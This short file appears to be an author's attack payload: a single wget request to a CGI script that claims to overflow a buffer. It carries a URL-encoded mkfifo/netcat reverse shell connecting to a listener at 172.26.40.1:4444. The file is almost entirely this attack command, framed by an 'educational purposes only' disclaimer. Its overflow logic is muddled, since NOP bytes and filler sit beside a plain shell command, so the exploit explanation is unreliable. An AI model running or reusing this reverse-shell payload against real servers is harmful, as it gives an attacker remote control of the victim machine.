# Created August 24th, 2023 - By: Devon Griffith A.K.A. rootPHAGE / 我爱数据
# This is the payload that we inject into the target server to overflow the buffer and establish a reverse shell
# It is one command all together

sudo wget "http://localhost/cgi-bin/vulnerable.cgi?input=Buffer:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDEFGHIJKLMNOPQRSTUVWXYZ12344567890ABCDEFGHI%90%90%90%90%90%90%90%90%90%90%90%90%90%90mkfifo%20/tmp/f;%20cat%20/tmp/f%20|%20/bin/sh%20-i%202>%261%20|%20nc%20172.26.40.1%204444%20>%20/tmp/f"

# DO NOT USE THIS SCRIPT MALICIOUSLY - PROVIDED FOR EDUCATIONAL PURPOSES ONLY
